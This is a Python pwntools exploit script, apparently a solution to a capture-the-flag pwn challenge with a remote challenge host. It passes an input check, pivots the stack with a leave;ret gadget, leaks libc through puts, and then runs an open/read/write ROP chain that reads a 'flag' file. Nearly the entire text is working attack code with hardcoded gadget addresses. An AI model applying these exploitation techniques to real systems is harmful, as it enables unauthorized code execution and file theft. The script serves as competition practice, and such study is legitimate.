from os import popen
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "pwn-33edafaac8.challenge.xctf.org.cn", 9999, ssl=True)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


payload = b""


io.send(b"a" * 0x12)
rand = [53, 60, 60, 8, 64, 46, 49, 34, 64, 50, 21, 18, 49, 72, 65, 92, 79, 73, 4, 9, 79, 65, 1, 2, 18, 65, 87, 84, 62, 10, 95, 14, 22, 6, 74, 85, 51, 74, 70, 66, 75, 42, 83, 23, 13, 99, 67, 44, 71,
        22, 52, 49, 86, 53, 3, 55, 17, 41, 39, 30, 51, 85, 95, 24, 90, 20, 8, 92, 94, 29, 57, 68, 71, 39, 91, 83, 89, 9, 78, 59, 30, 82, 60, 67, 34, 62, 22, 2, 2, 12, 83, 4, 48, 29, 27, 37, 49, 86, 80, 42]

for i in rand:
    io.sendafter("code:", p8(i))


def add(idx, data):
    io.sendafter(">>", p8(1))
    io.sendafter("Index: \n", p8(idx))
    io.sendlineafter("Note: \n", data)


add(0, "aaaa")

leave_ret = 0x4013EE
bss = 0x4040A0 + 0x200
loop = 0x4017A5
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pop_rdi = 0x0000000000401893
pop_rsi = 0x0000000000401891
"""
0x000000000040127d : pop rbp ; ret
0x0000000000401893 : pop rdi ; ret
0x0000000000401891 : pop rsi ; pop r15 ; ret

0x000000000002601f : pop rsi ; ret
0x0000000000142c92 : pop rdx ; ret

"""

payload = b"a" * 0x100
payload += p64(bss)
payload += p64(0x4013CF)
payload = payload.ljust(0x130, b"t")
io.send(payload)

payload = b"b" * 0x100
payload += p64(bss+0x100)
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(0x4013CF)
payload = payload.ljust(0x130, b"t")
ddebug("b *0x401893\ncontinue")
io.send(payload)

leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
log.success("libc.address :-----> " + hex(libc.address))


# orw
pop_rsi = libc.address + 0x000000000002601f
pop_rdx = libc.address + 0x0000000000142c92
system_addr = libc.symbols.get("system")
openadr = libc.symbols.get("open")
read = libc.symbols.get("read")
write = libc.symbols.get("write")


payload = b"flag" + b"\x00"*4
payload = payload.ljust(0x20, b"a")

payload += p64(pop_rdi)
payload += p64(0x4042a0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(openadr)

payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(100)
payload += p64(read)

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(100)
payload += p64(write)

payload = payload.ljust(0x130, b"t")
io.send(payload)


io.interactive()
